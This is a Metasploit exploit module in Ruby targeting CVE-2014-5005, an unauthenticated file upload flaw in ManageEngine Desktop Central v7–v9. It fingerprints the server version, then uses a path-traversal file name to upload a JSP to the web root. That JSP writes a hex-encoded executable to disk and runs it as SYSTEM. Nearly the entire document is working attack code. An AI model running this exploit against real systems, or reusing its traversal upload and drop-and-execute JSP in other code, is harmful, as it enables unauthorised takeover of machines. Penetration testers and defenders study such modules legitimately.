# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require &#039;msf/core&#039;
class Metasploit3 < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::EXE
include Msf::Exploit::FileDropper
def initialize(info = {})
super(update_info(info,
&#039;Name&#039; => &#039;ManageEngine Desktop Central StatusUpdate Arbitrary File Upload&#039;,
&#039;Description&#039; => %q{
This module exploits an arbitrary file upload vulnerability in ManageEngine DesktopCentral
v7 to v9 build 90054 (including the MSP versions).
A malicious user can upload a JSP file into the web root without authentication, leading to
arbitrary code execution as SYSTEM. Some early builds of version 7 are not exploitable as
they do not ship with a bundled Java compiler.
},
&#039;Author&#039; =>
[
&#039;Pedro Ribeiro <pedrib[at]gmail.com>&#039; # Vulnerability discovery and Metasploit module
],
&#039;License&#039; => MSF_LICENSE,
&#039;References&#039; =>
[
[&#039;CVE&#039;, &#039;2014-5005&#039;],
[&#039;OSVDB&#039;, &#039;110643&#039;],
[&#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2014/Aug/88&#039;],
[&#039;URL&#039;, &#039;https://raw.githubusercontent.com/pedrib/PoC/master/me_dc9_file_upload.txt&#039;]
],
&#039;Platform&#039; => &#039;win&#039;,
&#039;Arch&#039; => ARCH_X86,
&#039;Targets&#039; =>
[
[ &#039;Desktop Central v7 to v9 build 90054 / Windows&#039;, {} ]
],
&#039;Privileged&#039; => true,
&#039;DefaultTarget&#039; => 0,
&#039;DisclosureDate&#039; => &#039;Aug 31 2014&#039;
))
register_options([Opt::RPORT(8020)], self.class)
end
# Test for Desktop Central
def check
res = send_request_cgi({
&#039;uri&#039; => normalize_uri("configurations.do"),
&#039;method&#039; => &#039;GET&#039;
})
if res && res.code == 200
build = nil
if res.body.to_s =~ /ManageEngine Desktop Central 7/ ||
res.body.to_s =~ /ManageEngine Desktop Central MSP 7/ # DC v7
print_status("#{peer} - Detected Desktop Central v7")
elsif res.body.to_s =~ /ManageEngine Desktop Central 8/ ||
res.body.to_s =~ /ManageEngine Desktop Central MSP 8/
if res.body.to_s =~ /id="buildNum" value="([0-9]+)"\/>/ # DC v8 (later versions)
build = $1
print_status("#{peer} - Detected Desktop Central v8 #{build}")
else # DC v8 (earlier versions)
print_status("#{peer} - Detected Desktop Central v8")
end
elsif res.body.to_s =~ /id="buildNum" value="([0-9]+)"\/>/ # DC v9 (and higher?)
build = $1
end
if build.nil?
return Exploit::CheckCode::Unknown
elsif Gem::Version.new(build) < Gem::Version.new("90055")
return Exploit::CheckCode::Appears
else
return Exploit::CheckCode::Safe
end
end
Exploit::CheckCode::Unknown
end
def exploit
print_status("#{peer} - Uploading JSP to execute the payload")
exe = payload.encoded_exe
exe_filename = rand_text_alpha_lower(8) + ".exe"
jsp_payload = jsp_drop_and_execute(exe, exe_filename)
jsp_name = rand_text_alpha_lower(8) + ".jsp"
send_request_cgi({
&#039;uri&#039; => normalize_uri(&#039;statusUpdate&#039;),
&#039;method&#039; => &#039;POST&#039;,
&#039;data&#039; => jsp_payload,
&#039;ctype&#039; => &#039;text/html&#039;,
&#039;vars_get&#039; => {
&#039;actionToCall&#039; => &#039;LFU&#039;,
&#039;configDataID&#039; => &#039;1&#039;,
&#039;customerId&#039; => rand_text_numeric(4),
&#039;fileName&#039; => &#039;../&#039; * 6 << jsp_name
}
})
# We could check for HTTP 200 and a "success" string.
# However only some later v8 and v9 versions return this; and we don&#039;t really care
# and do a GET to the file we just uploaded anyway.
register_files_for_cleanup(exe_filename)
register_files_for_cleanup("..\\webapps\\DesktopCentral\\#{jsp_name}")
print_status("#{peer} - Executing payload")
send_request_cgi(
{
&#039;uri&#039; => normalize_uri(jsp_name),
&#039;method&#039; => &#039;GET&#039;
})
end
def jsp_drop_bin(bin_data, output_file)
jspraw = %Q|<%@ page import="java.io.*" %>\n|
jspraw << %Q|<%\n|
jspraw << %Q|String data = "#{Rex::Text.to_hex(bin_data, "")}";\n|
jspraw << %Q|FileOutputStream outputstream = new FileOutputStream("#{output_file}");\n|
jspraw << %Q|int numbytes = data.length();\n|
jspraw << %Q|byte[] bytes = new byte[numbytes/2];\n|
jspraw << %Q|for (int counter = 0; counter < numbytes; counter += 2)\n|
jspraw << %Q|{\n|
jspraw << %Q| char char1 = (char) data.charAt(counter);\n|
jspraw << %Q| char char2 = (char) data.charAt(counter + 1);\n|
jspraw << %Q| int comb = Character.digit(char1, 16) & 0xff;\n|
jspraw << %Q| comb <<= 4;\n|
jspraw << %Q| comb += Character.digit(char2, 16) & 0xff;\n|
jspraw << %Q| bytes[counter/2] = (byte)comb;\n|
jspraw << %Q|}\n|
jspraw << %Q|outputstream.write(bytes);\n|
jspraw << %Q|outputstream.close();\n|
jspraw << %Q|%>\n|
jspraw
end
def jsp_execute_command(command)
jspraw = %Q|\n|
jspraw << %Q|<%\n|
jspraw << %Q|Runtime.getRuntime().exec("#{command}");\n|
jspraw << %Q|%>\n|
jspraw
end
def jsp_drop_and_execute(bin_data, output_file)
jsp_drop_bin(bin_data, output_file) + jsp_execute_command(output_file)
end
end

